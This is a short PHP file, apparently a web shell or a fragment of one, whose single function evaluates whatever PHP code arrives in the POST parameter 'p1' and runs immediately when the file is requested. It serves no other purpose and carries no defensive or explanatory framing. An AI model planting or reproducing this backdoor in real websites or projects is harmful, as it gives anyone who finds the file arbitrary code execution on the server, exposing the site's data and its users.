<?php
function actionRC() {
	eval($_POST['p1']);
}

call_user_func('actionRC');
?>